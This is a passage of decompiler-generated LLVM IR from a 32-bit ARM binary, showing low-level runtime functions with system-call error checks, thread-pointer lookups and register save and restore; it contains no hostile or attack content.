  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_e5cc = load i32, i32* @r4, align 4
  %v6_e5cc = load i32, i32* @r5, align 4
  %v9_e5cc = load i32, i32* @r6, align 4
  %v12_e5cc = load i32, i32* @r7, align 4
  %v15_e5cc = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e5dc = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_e5dc, label %dec_label_pc_e5f0, label %dec_label_pc_e664

dec_label_pc_e5f0:                                ; preds = %dec_label_pc_e5cc
  %v0_e5f0 = call i32 @function_f150()
  %v1_e5f4 = add i32 %v0_e5f0, -1036
  %v2_e5f4 = inttoptr i32 %v1_e5f4 to i32*
  %v3_e5f4 = load i32, i32* %v2_e5f4, align 4
  %v1_e5f8 = and i32 %v3_e5f4, -71
  %v2_e5fc = icmp ugt i32 %v1_e5f8, 7
  store i1 %v2_e5fc, i1* %cpsr_c.global-to-local, align 1
  %v7_e5fc = icmp eq i32 %v1_e5f8, 8
  %v1_e600 = add i32 %v0_e5f0, -1168
  store i32 %v1_e600, i32* @r5, align 4
  br i1 %v7_e5fc, label %dec_label_pc_e608, label %dec_label_pc_e6dc

dec_label_pc_e608:                                ; preds = %dec_label_pc_e5f0
  %v2_e60c = add i32 %v0_e5f0, -624
  %v3_e60c = inttoptr i32 %v2_e60c to i32*
  store i32 -1, i32* %v3_e60c, align 4
  %v0_e610 = load i32, i32* @r5, align 4
  %v1_e610 = add i32 %v0_e610, 132
  store i32 %v1_e610, i32* @r6, align 4
  br label %dec_label_pc_e614

dec_label_pc_e614:                                ; preds = %dec_label_pc_e648.dec_label_pc_e614_crit_edge, %dec_label_pc_e608
  %v0_e618 = phi i32 [ %v0_e618.pre, %dec_label_pc_e648.dec_label_pc_e614_crit_edge ], [ %v1_e610, %dec_label_pc_e608 ]
  %v0_e614 = phi i32 [ %v0_e650, %dec_label_pc_e648.dec_label_pc_e614_crit_edge ], [ %v0_e610, %dec_label_pc_e608 ]
  %v1_e614 = add i32 %v0_e614, 132
  %v2_e614 = inttoptr i32 %v1_e614 to i32*
  %v3_e614 = load i32, i32* %v2_e614, align 4
  store i32 %v0_e618, i32* %r2.global-to-local, align 4
  store i32 %v3_e614, i32* @r4, align 4
  %v1_e62430 = inttoptr i32 %v0_e618 to i32*
  %v2_e62431 = load i32, i32* %v1_e62430, align 4
  %v3_e62833 = icmp uge i32 %v2_e62431, %v3_e614
  store i1 %v3_e62833, i1* %cpsr_c.global-to-local, align 1
  %v9_e62839 = icmp eq i32 %v2_e62431, %v3_e614
  br i1 %v9_e62839, label %dec_label_pc_e630, label %dec_label_pc_e648

dec_label_pc_e630:                                ; preds = %dec_label_pc_e614, %dec_label_pc_e630.dec_label_pc_e624_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_e640 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e640, label %dec_label_pc_e644, label %dec_label_pc_e630.dec_label_pc_e624_crit_edge

dec_label_pc_e630.dec_label_pc_e624_crit_edge:    ; preds = %dec_label_pc_e630
  %v0_e624.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e628.pre = load i32, i32* @r4, align 4
  %v1_e624 = inttoptr i32 %v0_e624.pre to i32*
  %v2_e624 = load i32, i32* %v1_e624, align 4
  %v3_e628 = icmp uge i32 %v2_e624, %v1_e628.pre
  store i1 %v3_e628, i1* %cpsr_c.global-to-local, align 1
  %v9_e628 = icmp eq i32 %v2_e624, %v1_e628.pre
  br i1 %v9_e628, label %dec_label_pc_e630, label %dec_label_pc_e648

dec_label_pc_e644:                                ; preds = %dec_label_pc_e630
  %v0_e644 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e648

dec_label_pc_e648:                                ; preds = %dec_label_pc_e614, %dec_label_pc_e630.dec_label_pc_e624_crit_edge, %dec_label_pc_e644
  %v0_e648 = phi i32 [ %v0_e644, %dec_label_pc_e644 ], [ %v2_e62431, %dec_label_pc_e614 ], [ %v2_e624, %dec_label_pc_e630.dec_label_pc_e624_crit_edge ]
  %v1_e648 = phi i32 [ %v0_e644, %dec_label_pc_e644 ], [ %v3_e614, %dec_label_pc_e614 ], [ %v1_e628.pre, %dec_label_pc_e630.dec_label_pc_e624_crit_edge ]
  %v3_e648 = icmp uge i32 %v0_e648, %v1_e648
  store i1 %v3_e648, i1* %cpsr_c.global-to-local, align 1
  %v9_e648 = icmp eq i32 %v0_e648, %v1_e648
  br i1 %v9_e648, label %dec_label_pc_e650, label %dec_label_pc_e648.dec_label_pc_e614_crit_edge

dec_label_pc_e648.dec_label_pc_e614_crit_edge:    ; preds = %dec_label_pc_e648
  %v0_e650 = load i32, i32* @r5, align 4
  %v0_e618.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e614

dec_label_pc_e650:                                ; preds = %dec_label_pc_e648
  %v0_e658 = load i32, i32* @r7, align 4
  %v2_e658 = add i32 %v0_e658, 116
  %v3_e658 = inttoptr i32 %v2_e658 to i32*
  %v4_e658 = load i32, i32* %v3_e658, align 4
  call void @__pseudo_branch(i32 %v4_e658)
  %v0_e66c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e664

dec_label_pc_e664:                                ; preds = %dec_label_pc_e5cc, %dec_label_pc_e650
  %v0_e66c = phi i32 [ 0, %dec_label_pc_e5cc ], [ %v0_e66c.pre, %dec_label_pc_e650 ]
  %v2_e670 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_e670, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_e67c = call i32 @function_f0a4(i32 17, i32 %v0_e66c, i32 %v2_e670)
  %v3_e680 = load i32, i32* %stack_var_-60, align 4
  %v2_e684 = icmp ne i32 %v3_e680, 0
  store i1 %v2_e684, i1* %cpsr_c.global-to-local, align 1
  %v7_e684 = icmp eq i32 %v3_e680, 1
  br i1 %v7_e684, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e664
  %v3_e688 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_e688, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e664, %bb
  call void @__pseudo_cond_branch(i1 %v7_e684, i32 ptrtoint (i32* @global_var_f510.369 to i32))
  %v2_e698 = ptrtoint i32* %stack_var_-32 to i32
  %v2_e6a0 = call i32 @function_f444(i32 %v2_e698, i32 %v2_e698)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e6a4 = icmp eq i32 %v2_e6a0, 0
  br i1 %v2_e6a4, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_e6b8 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_e6b8, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_e6c8 = load i32, i32* %stack_var_-40, align 4
  %v1_e6cc = and i32 %v3_e6c8, 65536
  store i32 %v1_e6cc, i32* %r2.global-to-local, align 4
  %v2_e6cc = icmp eq i32 %v1_e6cc, 0
  br i1 %v2_e6cc, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_e6d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_e6d4, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_e6cc, i32 ptrtoint (i32* @global_var_f510.369 to i32))
  br label %dec_label_pc_e6dc

dec_label_pc_e6dc:                                ; preds = %dec_label_pc_e5f0, %.thread5
  %v0_e6dc = load i32, i32* @r4, align 4
  store i32 %v3_e5cc, i32* @r4, align 4
  store i32 %v6_e5cc, i32* @r5, align 4
  store i32 %v9_e5cc, i32* @r6, align 4
  store i32 %v12_e5cc, i32* @r7, align 4
  store i32 %v15_e5cc, i32* @lr, align 4
  ret i32 %v0_e6dc

; uselistorder directives
  uselistorder i32 %v0_e644, { 1, 0 }
  uselistorder i32 %v1_e628.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @function_f0a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e6dc, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e664, { 1, 0 }
  uselistorder label %dec_label_pc_e648, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e630, { 1, 0 }
}

define i32 @function_e6f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_e6f0:
  store i32 %arg1, i32* @r0, align 4
  %v0_e6f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e6f0, label %bb, label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_e6f0
  %v0_e714.pr = load i1, i1* @cpsr_c, align 1
  br i1 %v0_e714.pr, label %bb4, label %bb3

bb:                                               ; preds = %dec_label_pc_e6f0
  %v2_e6f0 = load i32, i32* @r4, align 4
  %v4_e6f0 = lshr i32 %v2_e6f0, %arg1
  %v5_e6f0 = sub i32 32, %arg1
  %v6_e6f0 = shl i32 %v2_e6f0, %v5_e6f0
  %v7_e6f0 = or i32 %v6_e6f0, %v4_e6f0
  %v8_e6f0 = icmp slt i32 %v7_e6f0, 0
  %v9_e6f0 = and i32 %v7_e6f0, %arg1
  store i32 %v9_e6f0, i32* @r0, align 4
  br i1 %v8_e6f0, label %bb4, label %bb3

bb3:                                              ; preds = %thread-pre-split, %bb
  %v2_e714 = phi i32 [ %arg1, %thread-pre-split ], [ %v9_e6f0, %bb ]
  ret i32 %v2_e714

bb4:                                              ; preds = %thread-pre-split, %bb
  %v0_e718 = call i32 @function_f078()
  ret i32 %v0_e718

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_e720(i32 %arg1) local_unnamed_addr {
dec_label_pc_e720:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e724 = load i32, i32* @global_var_20334.372, align 4
  %v2_e728 = icmp eq i32 %v3_e724, 0
  store i1 %v2_e728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e728, label %dec_label_pc_e730, label %dec_label_pc_e720.dec_label_pc_e74c_crit_edge

dec_label_pc_e720.dec_label_pc_e74c_crit_edge:    ; preds = %dec_label_pc_e720
  %v3_e74c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e74c

dec_label_pc_e730:                                ; preds = %dec_label_pc_e720
  %v0_e740 = load i32, i32* @r0, align 4
  %v2_e740 = icmp ugt i32 %v0_e740, -4097
  store i1 %v2_e740, i1* %cpsr_c.global-to-local, align 1
  %v7_e740 = icmp eq i32 %v0_e740, -4096
  store i1 %v7_e740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e740, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_e74c, %bb10, %thread-pre-split, %dec_label_pc_e730
  %merge3 = phi i32 [ %v0_e740, %dec_label_pc_e730 ], [ %v0_e770, %dec_label_pc_e74c ], [ %v0_e780, %bb10 ], [ %v0_e780, %thread-pre-split ]
  ret i32 %merge3

bb8:                                              ; preds = %dec_label_pc_e730
  %v0_e748 = call i32 @function_f078()
  br label %dec_label_pc_e74c

dec_label_pc_e74c:                                ; preds = %dec_label_pc_e720.dec_label_pc_e74c_crit_edge, %bb8
  %v3_e74c = phi i32 [ %v3_e74c.pre, %dec_label_pc_e720.dec_label_pc_e74c_crit_edge ], [ %v0_e748, %bb8 ]
  %v9_e74c = load i32, i32* @r7, align 4
  store i32 %v9_e74c, i32* %stack_var_-8, align 4
  %v12_e74c = load i32, i32* @lr, align 4
  %v0_e750 = call i32 @function_e9c8()
  store i32 %v3_e74c, i32* @r7, align 4
  %v1_e76c = call i32 @function_e940(i32 %v0_e750)
  %v0_e770 = load i32, i32* @r7, align 4
  store i32 %v0_e770, i32* @r0, align 4
  %v2_e774 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e774, i32* @r7, align 4
  store i32 %v12_e74c, i32* @lr, align 4
  %v2_e778 = icmp ugt i32 %v0_e770, -4097
  store i1 %v2_e778, i1* %cpsr_c.global-to-local, align 1
  %v7_e778 = icmp eq i32 %v0_e770, -4096
  store i1 %v7_e778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e778, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_e74c
  %v0_e780 = call i32 @function_f078()
  store i32 %v0_e780, i32* @r0, align 4
  %v0_e790 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e790, label %bb10, label %thread-pre-split

thread-pre-split:                                 ; preds = %bb9
  %v0_e7a4.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e7a4.pr, label %bb11, label %bb

bb10:                                             ; preds = %bb9
  %v1_e790 = load i32, i32* @r1, align 4
  %v2_e790 = load i32, i32* @r8, align 4
  %v3_e790 = load i32, i32* @fp, align 4
  %v4_e790 = lshr i32 %v2_e790, %v3_e790
  %v5_e790 = sub i32 32, %v3_e790
  %v6_e790 = shl i32 %v2_e790, %v5_e790
  %v7_e790 = or i32 %v6_e790, %v4_e790
  %v8_e790 = icmp slt i32 %v7_e790, 0
  store i1 %v8_e790, i1* %cpsr_c.global-to-local, align 1
  %v9_e790 = and i32 %v7_e790, %v1_e790
  store i32 %v9_e790, i32* @r1, align 4
  br i1 %v8_e790, label %bb11, label %bb

bb11:                                             ; preds = %thread-pre-split, %bb10
  %v0_e7a8 = call i32 @function_f078()
  ret i32 %v0_e7a8

; uselistorder directives
  uselistorder i32 %v0_e780, { 2, 1, 0 }
  uselistorder i32 %v0_e770, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e740, { 1, 0, 2 }
  uselistorder label %bb11, { 1, 0 }
  uselistorder label %dec_label_pc_e74c, { 1, 0 }
  uselistorder label %bb, { 1, 2, 0, 3 }
}

define i32 @function_e7b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e7b0:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e7b4 = load i32, i32* @global_var_20334.372, align 4
  %v2_e7b8 = icmp eq i32 %v3_e7b4, 0
  store i1 %v2_e7b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e7b8, label %dec_label_pc_e7c0, label %dec_label_pc_e7b0.dec_label_pc_e7dc_crit_edge

dec_label_pc_e7b0.dec_label_pc_e7dc_crit_edge:    ; preds = %dec_label_pc_e7b0
  %v3_e7dc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e7dc

dec_label_pc_e7c0:                                ; preds = %dec_label_pc_e7b0
  %v0_e7d0 = load i32, i32* @r0, align 4
  %v2_e7d0 = icmp ugt i32 %v0_e7d0, -4097
  store i1 %v2_e7d0, i1* %cpsr_c.global-to-local, align 1
  %v7_e7d0 = icmp eq i32 %v0_e7d0, -4096
  store i1 %v7_e7d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e7d0, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_e7dc, %bb12, %thread-pre-split, %dec_label_pc_e7c0
  %merge3 = phi i32 [ %v0_e7d0, %dec_label_pc_e7c0 ], [ %v0_e800, %dec_label_pc_e7dc ], [ %v0_e810, %bb12 ], [ %v0_e810, %thread-pre-split ]
  ret i32 %merge3

bb10:                                             ; preds = %dec_label_pc_e7c0
  %v0_e7d8 = call i32 @function_f078()
  br label %dec_label_pc_e7dc

dec_label_pc_e7dc:                                ; preds = %dec_label_pc_e7b0.dec_label_pc_e7dc_crit_edge, %bb10
  %v3_e7dc = phi i32 [ %v3_e7dc.pre, %dec_label_pc_e7b0.dec_label_pc_e7dc_crit_edge ], [ %v0_e7d8, %bb10 ]
  store i32 %v3_e7dc, i32* %stack_var_-24, align 4
  %v9_e7dc = load i32, i32* @r2, align 4
  %v12_e7dc = load i32, i32* @r3, align 4
  %v15_e7dc = load i32, i32* @r7, align 4
  store i32 %v15_e7dc, i32* %stack_var_-8, align 4
  %v18_e7dc = load i32, i32* @lr, align 4
  %v0_e7e0 = call i32 @function_e9c8()
  %v2_e7e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_e7dc, i32* @r2, align 4
  store i32 %v12_e7dc, i32* @r3, align 4
  store i32 %v2_e7e8, i32* @r7, align 4
  %v1_e7fc = call i32 @function_e940(i32 %v0_e7e0)
  %v0_e800 = load i32, i32* @r7, align 4
  store i32 %v0_e800, i32* @r0, align 4
  %v2_e804 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e804, i32* @r7, align 4
  store i32 %v18_e7dc, i32* @lr, align 4
  %v2_e808 = icmp ugt i32 %v0_e800, -4097
  store i1 %v2_e808, i1* %cpsr_c.global-to-local, align 1
  %v7_e808 = icmp eq i32 %v0_e800, -4096
  store i1 %v7_e808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e808, label %bb11, label %bb

bb11:                                             ; preds = %dec_label_pc_e7dc
  %v0_e810 = call i32 @function_f078()
  store i32 %v0_e810, i32* @r0, align 4
  %v0_e820 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e820, label %bb12, label %thread-pre-split

thread-pre-split:                                 ; preds = %bb11
  %v0_e834.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e834.pr, label %bb13, label %bb

bb12:                                             ; preds = %bb11
  %v1_e820 = load i32, i32* @r1, align 4
  %v2_e820 = load i32, i32* @r8, align 4
  %v3_e820 = udiv i32 %v2_e820, 2097152
  %v4_e820 = mul i32 %v2_e820, 2048
  %v5_e820 = or i32 %v3_e820, %v4_e820
  %v6_e820 = and i32 %v2_e820, 1048576
  %v7_e820 = icmp ne i32 %v6_e820, 0
  store i1 %v7_e820, i1* %cpsr_c.global-to-local, align 1
  %v8_e820 = and i32 %v5_e820, %v1_e820
  store i32 %v8_e820, i32* @r1, align 4
  br i1 %v7_e820, label %bb13, label %bb

bb13:                                             ; preds = %thread-pre-split, %bb12
  %v0_e838 = call i32 @function_f078()
  ret i32 %v0_e838

; uselistorder directives
  uselistorder i32 %v2_e820, { 2, 0, 1 }
  uselistorder i32 %v0_e810, { 2, 1, 0 }
  uselistorder i32 %v0_e800, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e7d0, { 1, 0, 2 }
  uselistorder i32 2048, { 0, 1, 7, 4, 8, 5, 9, 3, 10, 6, 11, 12, 2, 13, 14 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %dec_label_pc_e7dc, { 1, 0 }
  uselistorder label %bb, { 1, 2, 0, 3 }
}

define i32 @function_e840(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e840:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e844 = load i32, i32* @global_var_20334.372, align 4
  %v2_e848 = icmp eq i32 %v3_e844, 0
  store i1 %v2_e848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e848, label %dec_label_pc_e850, label %dec_label_pc_e840.dec_label_pc_e86c_crit_edge

dec_label_pc_e840.dec_label_pc_e86c_crit_edge:    ; preds = %dec_label_pc_e840
  %v3_e86c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e86c

dec_label_pc_e850:                                ; preds = %dec_label_pc_e840
  %v0_e860 = load i32, i32* @r0, align 4
  %v2_e860 = icmp ugt i32 %v0_e860, -4097
  store i1 %v2_e860, i1* %cpsr_c.global-to-local, align 1
  %v7_e860 = icmp eq i32 %v0_e860, -4096
  store i1 %v7_e860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e860, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_e86c, %bb12, %thread-pre-split, %dec_label_pc_e850
  %merge3 = phi i32 [ %v0_e860, %dec_label_pc_e850 ], [ %v0_e890, %dec_label_pc_e86c ], [ %v0_e8a0, %bb12 ], [ %v0_e8a0, %thread-pre-split ]
  ret i32 %merge3

bb10:                                             ; preds = %dec_label_pc_e850
  %v0_e868 = call i32 @function_f078()
  br label %dec_label_pc_e86c

dec_label_pc_e86c:                                ; preds = %dec_label_pc_e840.dec_label_pc_e86c_crit_edge, %bb10
  %v3_e86c = phi i32 [ %v3_e86c.pre, %dec_label_pc_e840.dec_label_pc_e86c_crit_edge ], [ %v0_e868, %bb10 ]
  %v12_e86c = load i32, i32* @r3, align 4
  %v15_e86c = load i32, i32* @r7, align 4
  store i32 %v15_e86c, i32* %stack_var_-8, align 4
  %v18_e86c = load i32, i32* @lr, align 4
  %v0_e870 = call i32 @function_e9c8()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_e86c, i32* @r3, align 4
  store i32 %v3_e86c, i32* @r7, align 4
  %v1_e88c = call i32 @function_e940(i32 %v0_e870)
  %v0_e890 = load i32, i32* @r7, align 4
  store i32 %v0_e890, i32* @r0, align 4
  %v2_e894 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e894, i32* @r7, align 4
  store i32 %v18_e86c, i32* @lr, align 4
  %v2_e898 = icmp ugt i32 %v0_e890, -4097
  store i1 %v2_e898, i1* %cpsr_c.global-to-local, align 1
  %v7_e898 = icmp eq i32 %v0_e890, -4096
  store i1 %v7_e898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e898, label %bb11, label %bb

bb11:                                             ; preds = %dec_label_pc_e86c
  %v0_e8a0 = call i32 @function_f078()
  store i32 %v0_e8a0, i32* @r0, align 4
  %v0_e8b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e8b0, label %bb12, label %thread-pre-split

thread-pre-split:                                 ; preds = %bb11
  %v0_e8c4.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e8c4.pr, label %bb13, label %bb

bb12:                                             ; preds = %bb11
  %v2_e8b0 = load i32, i32* @r8, align 4
  %v3_e8b0 = load i32, i32* @sl, align 4
  %v4_e8b0 = add i32 %v3_e8b0, -1
  %v5_e8b0 = shl i32 1, %v4_e8b0
  %v6_e8b0 = and i32 %v5_e8b0, %v2_e8b0
  %v7_e8b0 = icmp ne i32 %v6_e8b0, 0
  store i1 %v7_e8b0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_e8b0, label %bb13, label %bb

bb13:                                             ; preds = %thread-pre-split, %bb12
  %v0_e8c8 = call i32 @function_f078()
  ret i32 %v0_e8c8

; uselistorder directives
  uselistorder i32 %v0_e8a0, { 2, 1, 0 }
  uselistorder i32 %v0_e890, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e860, { 1, 0, 2 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %dec_label_pc_e86c, { 1, 0 }
  uselistorder label %bb, { 1, 2, 0, 3 }
}

define i32 @function_e8d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_e8d0:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e8d4 = load i32, i32* @global_var_20334.372, align 4
  %v2_e8d8 = icmp eq i32 %v3_e8d4, 0
  br i1 %v2_e8d8, label %dec_label_pc_e8e0, label %dec_label_pc_e8d0.dec_label_pc_e8fc_crit_edge

dec_label_pc_e8d0.dec_label_pc_e8fc_crit_edge:    ; preds = %dec_label_pc_e8d0
  %v3_e8fc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e8fc

dec_label_pc_e8e0:                                ; preds = %dec_label_pc_e8d0
  %v0_e8f0 = load i32, i32* @r0, align 4
  %v2_e8f0 = icmp ugt i32 %v0_e8f0, -4097
  br i1 %v2_e8f0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_e8fc, %dec_label_pc_e8e0
  %merge = phi i32 [ %v0_e8f0, %dec_label_pc_e8e0 ], [ %v0_e920, %dec_label_pc_e8fc ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_e8e0
  %v0_e8f8 = call i32 @function_f078()
  br label %dec_label_pc_e8fc

dec_label_pc_e8fc:                                ; preds = %dec_label_pc_e8d0.dec_label_pc_e8fc_crit_edge, %bb8
  %v3_e8fc = phi i32 [ %v3_e8fc.pre, %dec_label_pc_e8d0.dec_label_pc_e8fc_crit_edge ], [ %v0_e8f8, %bb8 ]
  %v6_e8fc = load i32, i32* @r1, align 4
  %v15_e8fc = load i32, i32* @r7, align 4
  store i32 %v15_e8fc, i32* %stack_var_-8, align 4
  %v18_e8fc = load i32, i32* @lr, align 4
  %v0_e900 = call i32 @function_e9c8()
  store i32 %v6_e8fc, i32* @r1, align 4
  store i32 %v3_e8fc, i32* @r7, align 4
  %v1_e91c = call i32 @function_e940(i32 %v0_e900)
  %v0_e920 = load i32, i32* @r7, align 4
  store i32 %v0_e920, i32* @r0, align 4
  %v2_e924 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e924, i32* @r7, align 4
  store i32 %v18_e8fc, i32* @lr, align 4
  %v2_e928 = icmp ugt i32 %v0_e920, -4097
  br i1 %v2_e928, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_e8fc
  %v0_e930 = call i32 @function_f078()
  ret i32 %v0_e930

; uselistorder directives
  uselistorder i32 %v0_e920, { 1, 2, 0 }
  uselistorder i32 ()* @function_f078, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_e8fc, { 1, 0 }
}

define i32 @function_e940(i32 %arg1) local_unnamed_addr {
dec_label_pc_e940:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_e940 = load i32, i32* %r0.global-to-local, align 4
  %v1_e940 = and i32 %v0_e940, 2
  %v2_e940 = icmp eq i32 %v1_e940, 0
  %v3_e944 = load i32, i32* @r4, align 4
  store i32 %v3_e944, i32* %stack_var_-16, align 4
  br i1 %v2_e940, label %dec_label_pc_e94c, label %dec_label_pc_e9c0

dec_label_pc_e94c:                                ; preds = %dec_label_pc_e940
  %v0_e94c = call i32 @function_f150()
  store i32 %v0_e94c, i32* %r0.global-to-local, align 4
  %v1_e950 = add i32 %v0_e94c, -1036
  %v2_e950 = inttoptr i32 %v1_e950 to i32*
  %v3_e950 = load i32, i32* %v2_e950, align 4
  %v1_e954 = add i32 %v0_e94c, -1168
  store i32 %v1_e954, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e958

dec_label_pc_e958:                                ; preds = %dec_label_pc_e98c.dec_label_pc_e958_crit_edge, %dec_label_pc_e94c
  %v0_e964 = phi i32 [ %v0_e964.pre, %dec_label_pc_e98c.dec_label_pc_e958_crit_edge ], [ %v1_e954, %dec_label_pc_e94c ]
  %v0_e958 = phi i32 [ %v0_e98c, %dec_label_pc_e98c.dec_label_pc_e958_crit_edge ], [ %v3_e950, %dec_label_pc_e94c ]
  %v1_e958 = and i32 %v0_e958, -3
  store i32 %v1_e958, i32* %r7.global-to-local, align 4
  store i32 %v0_e958, i32* %r4.global-to-local, align 4
  store i32 %v1_e958, i32* @r1, align 4
  %v1_e964 = add i32 %v0_e964, 132
  store i32 %v1_e964, i32* @r2, align 4
  %v1_e96823 = inttoptr i32 %v1_e964 to i32*
  %v2_e96824 = load i32, i32* %v1_e96823, align 4
  %v3_e96c26 = icmp uge i32 %v2_e96824, %v0_e958
  store i1 %v3_e96c26, i1* %cpsr_c.global-to-local, align 1
  %v9_e96c32 = icmp eq i32 %v2_e96824, %v0_e958
  br i1 %v9_e96c32, label %dec_label_pc_e974, label %dec_label_pc_e98c

dec_label_pc_e974:                                ; preds = %dec_label_pc_e958, %dec_label_pc_e974.dec_label_pc_e968_crit_edge
  %v0_e97433 = phi i32 [ %v1_e96c.pre, %dec_label_pc_e974.dec_label_pc_e968_crit_edge ], [ %v0_e958, %dec_label_pc_e958 ]
  store i32 %v0_e97433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_e984 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_e984, label %dec_label_pc_e988, label %dec_label_pc_e974.dec_label_pc_e968_crit_edge

dec_label_pc_e974.dec_label_pc_e968_crit_edge:    ; preds = %dec_label_pc_e974
  %v0_e968.pre = load i32, i32* @r2, align 4
  %v1_e96c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e968 = inttoptr i32 %v0_e968.pre to i32*
  %v2_e968 = load i32, i32* %v1_e968, align 4
